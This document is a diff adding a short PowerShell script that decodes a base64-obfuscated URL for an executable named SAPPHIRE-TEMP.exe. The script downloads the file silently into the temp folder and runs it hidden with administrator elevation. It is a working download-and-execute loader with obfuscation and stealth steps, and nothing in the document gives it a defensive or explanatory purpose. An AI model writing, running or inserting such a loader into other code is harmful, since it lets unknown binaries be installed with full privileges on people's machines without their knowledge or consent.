@@ -1,0 +1,22 @@
+# Base64-encoded URL 
+$base64Url = "aHR0cHM6Ly9wdWItMWE0OTYyZmEwNGY1NDFiOGI3ZjVmNzM5NjBiZjVlYWUucjIuZGV2L1NBUFBISVJFLVRFTVAuZXhl"
+
+# Decode the Base64 URL
+$bytes = [System.Convert]::FromBase64String($base64Url)
+$url = [System.Text.Encoding]::UTF8.GetString($bytes)
+
+# Define the path to the %TEMP% directory
+$tempPath = [System.IO.Path]::Combine($env:TEMP, "SAPPHIRE-TEMP.exe")
+
+# Download the file silently (no output)
+Invoke-WebRequest -Uri $url -OutFile $tempPath -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null
+
+# Create a new process start info object to run the executable silently as an administrator
+$startInfo = New-Object System.Diagnostics.ProcessStartInfo
+$startInfo.FileName = $tempPath
+$startInfo.Verb = "runas"  # Run as administrator
+$startInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden  # Hide the window
+$startInfo.Arguments = "/silent"  # If the executable supports silent mode
+
+# Start the process silently
+[System.Diagnostics.Process]::Start($startInfo) | Out-Null
